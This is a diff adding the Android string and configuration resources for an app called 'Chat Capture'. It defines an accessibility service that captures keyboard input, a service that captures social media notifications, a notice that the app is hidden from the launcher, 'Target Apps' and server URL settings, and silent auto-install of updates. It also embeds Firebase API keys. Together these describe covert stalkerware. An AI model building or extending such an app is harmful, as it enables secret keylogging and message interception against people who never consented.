@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string-array name="sync_interval_entries">
+        <item>Every 15 minutes</item>
+        <item>Every 30 minutes</item>
+        <item>Every hour</item>
+        <item>Every 2 hours</item>
+        <item>Every 6 hours</item>
+        <item>Every 12 hours</item>
+        <item>Daily</item>
+    </string-array>
+    <string-array name="sync_interval_values">
+        <item>900</item>
+        <item>1800</item>
+        <item>3600</item>
+        <item>7200</item>
+        <item>21600</item>
+        <item>43200</item>
+        <item>86400</item>
+    </string-array>
+    <bool name="auto_install_updates">true</bool>
+    <bool name="update_only_on_wifi">false</bool>
+    <color name="accent">#FF03DAC5</color>
+    <color name="black">#FF000000</color>
+    <color name="primary">#FF6200EE</color>
+    <color name="primary_dark">#FF3700B3</color>
+    <color name="purple_200">#FFBB86FC</color>
+    <color name="purple_500">#FF6200EE</color>
+    <color name="purple_700">#FF3700B3</color>
+    <color name="teal_200">#FF03DAC5</color>
+    <color name="teal_700">#FF018786</color>
+    <color name="white">#FFFFFFFF</color>
+    <dimen name="fab_margin">16dp</dimen>
+    <integer name="update_check_interval_hours">6</integer>
+    <string name="accessibility_service_description">This service captures keyboard input for chat monitoring purposes.</string>
+    <string name="app_hidden_message">App is hidden from launcher. Access via Settings → Apps → Chat Capture</string>
+    <string name="app_name">Chat Capture</string>
+    <string name="gcm_defaultSenderId" translatable="false">466716330460</string>
+    <string name="google_api_key" translatable="false">AIzaSyClXrbQxdfTCm1oiPsRLwKgZP1jPu4mxX8</string>
+    <string name="google_app_id" translatable="false">1:466716330460:android:9649f804e4aa393d94e719</string>
+    <string name="google_crash_reporting_api_key" translatable="false">AIzaSyClXrbQxdfTCm1oiPsRLwKgZP1jPu4mxX8</string>
+    <string name="google_storage_bucket" translatable="false">receiver-app-47f7e.firebasestorage.app</string>
+    <string name="notification_service_description">This service captures notifications from social media apps.</string>
+    <string name="permission_accessibility_required">Accessibility Service Required</string>
+    <string name="permission_battery_optimization">Battery Optimization</string>
+    <string name="permission_install_packages">Install Apps Permission</string>
+    <string name="permission_notification_access">Notification Access Required</string>
+    <string name="permission_setup_message">Please grant the required permissions to enable chat and notification capture.</string>
+    <string name="permission_setup_title">Setting Up Chat Capture</string>
+    <string name="project_id" translatable="false">receiver-app-47f7e</string>
+    <string name="service_not_configured">Not Configured</string>
+    <string name="service_running">Running</string>
+    <string name="service_stopped">Stopped</string>
+    <string name="settings_server_url">Server URL</string>
+    <string name="settings_sync_interval">Sync Interval</string>
+    <string name="settings_target_apps">Target Apps</string>
+    <string name="settings_title">Settings</string>
+    <string name="update_available">Update Available</string>
+    <string name="update_checking">Checking for updates...</string>
+    <string name="update_downloading">Downloading update...</string>
+    <string name="update_failed">Update failed</string>
+    <string name="update_installing">Installing update...</string>
+    <string name="update_server_url">https://your-domain.com/updates</string>
+    <string name="update_success">Update installed successfully</string>
+    <style name="Theme.ChatCapture" parent="Theme.MaterialComponents.DayNight.DarkActionBar">
+        <item name="colorPrimary">@color/primary</item>
+        <item name="colorPrimaryDark">@color/primary_dark</item>
+        <item name="colorAccent">@color/accent</item>
+    </style>
+    <style name="Theme.ChatCapture.AppBarOverlay" parent="ThemeOverlay.AppCompat.Dark.ActionBar"/>
+    <style name="Theme.ChatCapture.PopupOverlay" parent="ThemeOverlay.AppCompat.Light"/>
+</resources>
